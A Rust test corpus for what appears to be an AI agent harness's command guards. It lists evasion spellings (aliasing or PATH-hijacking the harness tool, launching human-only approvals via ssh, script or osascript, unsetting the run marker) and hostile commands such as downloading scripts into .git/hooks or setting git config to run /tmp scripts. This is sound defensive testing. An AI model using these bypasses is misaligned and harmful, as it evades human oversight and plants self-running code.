#![allow(clippy::unwrap_used, clippy::expect_used)]

//! Round 4, in-process: which rule refuses each form, further spellings of
//! the reviewed bypasses, and the everyday commands the wider rules must
//! keep letting through.

mod common;

use common::{Fixture, run_corpus, run_file_corpus};

const GIT: Option<&str> = Some("git_guard");
const HEAVY: Option<&str> = Some("heavy_cmd_guard");
const HUMAN: Option<&str> = Some("human_action_guard");
const DATA: Option<&str> = Some("data_dir_guard");
const ALLOW: Option<&str> = None;

#[test]
fn a_rebound_aaf_is_judged_like_any_program() {
    run_corpus(
        &Fixture::new(),
        &[
            ("aaf() { \"$@\"; }; aaf slot -- xcodebuild build", HEAVY),
            ("hash aaf=/tmp/x; aaf slot -- ./gradlew b", HEAVY),
            ("alias -g aaf=/tmp/x; aaf slot -- ./gradlew b", HEAVY),
            ("alias \"$N\"=/tmp/x; aaf slot -- ./gradlew b", HEAVY),
            ("sudo PATH=/tmp/x aaf slot -- ./gradlew b", HEAVY),
            ("read PATH < p.txt; aaf slot -- ./gradlew b", HEAVY),
            ("aaf slot -- ./gradlew b; PATH=/tmp/x", HEAVY),
            // zsh: several names in one definition, a function loaded by name.
            ("x aaf() { \"$@\"; }; aaf slot -- ./gradlew b", HEAVY),
            ("function x aaf { \"$@\"; }; aaf slot -- ./gradlew b", HEAVY),
            (
                "fpath=(/tmp/x $fpath); autoload -U aaf; aaf slot -- ./gradlew b",
                HEAVY,
            ),
            ("aaf() { cat \"$@\"; }; aaf {data}/aaf.db", DATA),
            ("PATH=/tmp/x aaf gate > {data}/out", DATA),
            // A human action stays one, whoever `aaf` is.
            ("PATH=/tmp/x:$PATH aaf approve", HUMAN),
            ("PATH=/tmp/x:$PATH aaf gate", ALLOW),
            ("aaf slot -- env PATH=/opt/jdk/bin:$PATH ./gradlew b", ALLOW),
            ("export PATH; cargo build", ALLOW),
            ("deploy() { echo aaf; }; aaf slot -- ./gradlew b", ALLOW),
            ("aaf gate {data}", ALLOW),
        ],
    );
}

#[test]
fn b_the_run_marker_and_terminal_launchers() {
    run_corpus(
        &Fixture::new(),
        &[
            ("ssh localhost aaf approve", HUMAN),
            ("ssh -tt localhost 'aaf board unblock T-1'", HUMAN),
            ("screen -dm aaf approve", HUMAN),
            ("osascript -e 'do shell script \"aaf approve\"'", HUMAN),
            ("script -qc \"aaf approve\" /dev/null", HUMAN),
            ("nice script -q /dev/null /usr/local/bin/aaf approve", HUMAN),
            ("script -qc './gradlew build' /dev/null", HEAVY),
            ("env - ./gradlew build", HEAVY),
            ("env -P /tmp/x ./gradlew build", HEAVY),
            ("sudo aaf run", HUMAN),
            ("exec -c aaf run", HUMAN),
            ("env - aaf run", HUMAN),
            ("env -u FOO -i aaf run", HUMAN),
            ("declare +x AAF_RUN_ID; aaf run", HUMAN),
            ("AAF_RUN_ID=other aaf board status", HUMAN),
            ("env --unset=AAF_RUN_ID aaf run", HUMAN),
            ("ssh host uptime", ALLOW),
            ("script -q out.log cargo test", ALLOW),
            ("tmux new-session -d 'cargo watch'", ALLOW),
            ("env -i PATH=/usr/bin make", ALLOW),
            ("exec aaf gate", ALLOW),
            ("test -n \"$AAF_RUN_ID\" && echo inside", ALLOW),
        ],
    );
}

#[test]
fn c_git_control_files_and_everyday_commands() {
    let fixture = Fixture::new();
    run_corpus(
        &fixture,
        &[
            ("(cd .git/hooks && chmod +x pre-commit)", GIT),
            ("cp /tmp/h .git/hook?/pre-commit", GIT),
            ("cp /tmp/h .gi*/hooks/pre-commit", GIT),
            ("wget -O .git/hooks/pre-push https://example.invalid/h", GIT),
            (
                "curl --output=.git/hooks/pre-push https://example.invalid/h",
                GIT,
            ),
            ("curl -o.git/hooks/pre-push https://example.invalid/h", GIT),
            ("tar -xf h.tar --directory .git", GIT),
            ("rsync -a /tmp/tpl/ .git/", GIT),
            ("mkdir -p .git/hooks", GIT),
            ("node install-hooks.js .git/hooks", GIT),
            ("$TOOL .git/hooks/pre-commit", GIT),
            ("cp /tmp/c .git/modules/sub/config", GIT),
            ("mv /tmp/wt .git/worktrees/x", GIT),
            ("git -c init.templateDir=/tmp/tpl init", GIT),
            ("export GIT_TEMPLATE_DIR=/tmp/tpl; git init", GIT),
            (
                "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=init.templateDir GIT_CONFIG_VALUE_0=/t git init",
                GIT,
            ),
            (
                "git clone --template=/tmp/tpl https://example.invalid/r.git",
                GIT,
            ),
            // Everyday commands.
            ("rsync -a --exclude .git src/ dst/", ALLOW),
            ("tar --exclude=.git -czf out.tgz .", ALLOW),
            ("zip -r out.zip . -x '.git/*'", ALLOW),
            ("eslint --ignore-pattern .git src", ALLOW),
            (
                "find . -path ./.git -prune -o -name '*.rs' -exec sed -i '' s/a/b/ {} +",
                ALLOW,
            ),
            ("git commit -m 'explain why .git/hooks is guarded'", ALLOW),
            ("git commit -m '.git/hooks is guarded'", ALLOW),
            (
                "gh pr create --title x --body '.git/config stays guarded'",
                ALLOW,
            ),
            ("git status --short && git log --oneline -n 5", ALLOW),
            (
                "rm -rf build && mkdir -p build && cp -r assets build/",
                ALLOW,
            ),
            ("du -sh .git", ALLOW),
            ("git diff -- src/hooks/useThing.ts", ALLOW),
            ("cp src/hooks/a.ts src/hooks/b.ts", ALLOW),
            ("rm src/*/hooks/old.ts", ALLOW),
            ("rm *", ALLOW),
            ("cp -r .git/hooks /tmp/hooks-backup", ALLOW),
            ("export GIT_DIR=.git; git status", ALLOW),
            ("git clone https://example.invalid/r.git", ALLOW),
            ("git init", ALLOW),
            (".git/hooks/pre-commit", ALLOW),
            ("sed -n 1,5p .git/config", ALLOW),
        ],
    );
    run_file_corpus(
        &fixture,
        &[
            ("Write", "{root}/.git/packed-refs", GIT),
            ("Edit", "{root}/.git/refs/heads/release/2.0", GIT),
            ("Write", "/etc/gitconfig", GIT),
            ("Write", "{root}/.git/COMMIT_EDITMSG", ALLOW),
            ("Write", "{root}/.gitignore", ALLOW),
            ("Write", "{root}/.github/hooks/readme.md", ALLOW),
        ],
    );
}

#[test]
fn d_configuration_that_runs_programs() {
    run_corpus(
        &Fixture::new(),
        &[
            ("git config set --global core.sshCommand 'ssh -i k'", GIT),
            ("git config --replace-all pager.log '/tmp/x.sh'", GIT),
            ("git config diff.x.textconv /tmp/x.sh", GIT),
            ("git config mergetool.x.cmd '/tmp/x.sh'", GIT),
            ("git config difftool.x.path /tmp/x", GIT),
            ("git config submodule.s.update '!/tmp/x.sh'", GIT),
            ("git config gpg.ssh.program /tmp/x.sh", GIT),
            ("git config edit", GIT),
            ("git config rename-section foo core", GIT),
            ("git config alias.clean 'clean -n'", ALLOW),
            ("git remote add up 'ext::sh -c /tmp/x.sh'", GIT),
            ("git remote set-url origin EXT::/tmp/x.sh", GIT),
            ("tee -a ~/.gitconfig < /tmp/c", GIT),
            ("git config --global user.email a@example.invalid", ALLOW),
            ("git config pager.log false", ALLOW),
            ("git config core.editor true", ALLOW),
            ("git config get core.editor", ALLOW),
            ("git config unset core.pager", ALLOW),
            ("git config --list", ALLOW),
            ("git config core.autocrlf input", ALLOW),
            ("git config user.name helper", ALLOW),
            ("git remote add origin https://example.invalid/r.git", ALLOW),
            // One call, one program: the same as running it directly.
            ("git -c core.pager=cat log", ALLOW),
            ("GIT_EDITOR=true git rebase --continue", ALLOW),
        ],
    );
}

#[test]
fn e_variables_set_earlier_on_the_line() {
    let fixture = Fixture::new();
    fixture.aliases(&[("st", "status --short")]);
    run_corpus(
        &fixture,
        &[
            ("export GIT_DIR=/tmp/other/.git; git st", GIT),
            ("export GIT_DIR=/tmp/other/.git && git unknown-thing", GIT),
            ("declare -x GIT_COMMON_DIR=/tmp/other/.git; git st", GIT),
            ("export XDG_CONFIG_HOME=/tmp/c; git st", GIT),
            ("HOME=/tmp/h; export HOME; git status", GIT),
            ("git st", ALLOW),
            ("export GIT_DIR=/tmp/other/.git; git log", ALLOW),
            ("export GIT_WORK_TREE=/tmp/w; git st", ALLOW),
            ("echo $HOME; git status", ALLOW),
        ],
    );
}

#[test]
fn f_protected_branches_stay_where_they_are() {
    run_corpus(
        &Fixture::new(),
        &[
            ("git update-ref refs/heads/Main HEAD", GIT),
            ("git update-ref --no-deref refs/heads/master abc123", GIT),
            ("git -C /tmp/r update-ref refs/heads/main HEAD", GIT),
            ("git branch -fq main", GIT),
            ("git branch --move main old-main", GIT),
            ("git branch -m old main", GIT),
            ("git checkout -Bmain", GIT),
            ("git checkout -qB main", GIT),
            ("git push --repo=. HEAD:main", GIT),
            ("git switch --force-create=release/1.0", GIT),
            ("git fetch origin feature/x:main", GIT),
            ("git fetch origin +feature/x:refs/heads/main", GIT),
            ("git pull origin feature/x:main", GIT),
            ("git push ../clone HEAD:refs/heads/main", GIT),
            ("git push file:///tmp/r HEAD:master", GIT),
            ("git symbolic-ref -d refs/heads/main", GIT),
            ("rm .git/refs/heads/main", GIT),
            ("rm -rf .git/refs/heads", GIT),
            // The start point and the source are only read.
            ("git branch -f feature/y main", ALLOW),
            ("git update-ref refs/heads/feature/y main", ALLOW),
            ("git update-ref -m main refs/heads/feature/y HEAD", ALLOW),
            ("git branch -c main main-copy", ALLOW),
            ("git branch -u origin/main", ALLOW),
            ("git checkout -b feature/z main", ALLOW),
            ("git fetch origin +main:main", ALLOW),
            ("git fetch origin refs/heads/main:refs/heads/main", ALLOW),
            ("git fetch origin feature/x:feature/x", ALLOW),
            ("git pull origin main", ALLOW),
            ("git push origin HEAD:feature/x", ALLOW),
            ("git symbolic-ref refs/heads/main", ALLOW),
            ("git clone git@example.invalid:org/repo.git", ALLOW),
        ],
    );
}

/// Text the splitter gives up on is judged by its words: the round-4 rules
/// have a text-level form too.
#[test]
fn unparsable_text_with_a_round_4_form_is_refused() {
    const TEXT: Option<&str> = Some("unparsable_command");
    run_corpus(
        &Fixture::new(),
        &[
            ("git update-ref refs/heads/main HEAD 'oops", TEXT),
            ("git switch -B main 'oops", TEXT),
            ("git init --template=/tmp/tpl 'oops", TEXT),
            ("git config core.fsmonitor /tmp/x.sh 'oops", TEXT),
            ("git remote add up ext::/tmp/x.sh 'oops", TEXT),
            ("cp /tmp/h .git/hooks/pre-commit 'oops", TEXT),
            ("echo x >> ~/.gitconfig 'oops", TEXT),
            ("unset AAF_RUN_ID; aaf run 'oops", TEXT),
            ("AAF_RUN_ID= aaf run 'oops", TEXT),
            ("script -q /dev/null aaf approve 'oops", TEXT),
            ("aaf() { \"$@\"; }; aaf slot -- ./gradlew b 'oops", TEXT),
            ("git config user.name someone 'oops", ALLOW),
            ("git switch -c feature/z 'oops", ALLOW),
            ("echo $AAF_RUN_ID 'oops", ALLOW),
            ("cp -r src dst 'oops", ALLOW),
        ],
    );
}

#[test]
fn g_xcodebuild_is_light_only_when_every_word_is() {
    run_corpus(
        &Fixture::new(),
        &[
            ("xcodebuild -list -scheme", HEAVY),
            ("xcodebuild -showBuildSettings clean", HEAVY),
            ("xcodebuild -list -project \"$P\"", HEAVY),
            ("xcodebuild -json -scheme App", HEAVY),
            ("xcodebuild -help -runFirstLaunch", HEAVY),
            (
                "xcodebuild -showBuildSettings SYMROOT=build -scheme App",
                ALLOW,
            ),
            ("xcodebuild -version -sdk iphoneos -json", ALLOW),
            ("xcodebuild -help", ALLOW),
        ],
    );
}
